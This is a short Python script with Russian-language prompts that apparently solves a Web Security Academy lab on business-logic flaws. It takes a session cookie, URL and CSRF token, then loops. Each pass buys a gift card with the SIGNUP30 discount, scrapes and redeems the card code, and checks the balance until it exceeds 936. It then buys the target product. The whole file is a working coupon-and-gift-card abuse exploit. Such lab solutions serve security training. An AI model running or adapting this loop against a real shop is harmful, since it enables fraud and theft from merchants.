import re
import requests

cookie = {"session":input("Введите куки: ")}
url = input("Введите URL(Например: https://lab-id.web-security-academy.net): ")
csrf = input("Введите CSRF-токен: ")
data_add_to_cart = {"productId":2, "redir":"PRODUCT","quantity":1}
data_active_coupon = {"csrf":csrf,"coupon":"SIGNUP30"}
data_buy = {"csrf":csrf}

while True:
    requests.post(url + "/cart", cookies=cookie, data=data_add_to_cart)
    requests.post(url + "/cart/coupon", cookies=cookie, data=data_active_coupon)
    gift = re.search(r'<td>([A-Za-z0-9]{10})</td>', requests.post(url + "/cart/checkout", cookies=cookie, data=data_buy).content.decode('utf-8')).group(1)
    data_gift_activate = {"csrf":csrf,"gift-card":gift}
    gift_actite = requests.post(url + "/gift-card", cookies=cookie, data=data_gift_activate)
    balance = re.search(r'\$([\d.]+)', requests.get(url + "/my-account", cookies=cookie).content.decode('utf-8')).group(1)
    print(int(balance[:-3]))
    if int(balance[:-3]) > 936:
        data_add_to_cart_l33t = {"productId":1, "redir":"PRODUCT","quantity":1}
        requests.post(url + "/cart", cookies=cookie, data=data_add_to_cart_l33t)
        requests.post(url + "/cart/coupon", cookies=cookie, data=data_active_coupon)
        requests.post(url + "/cart/checkout", cookies=cookie, data=data_buy)
        break
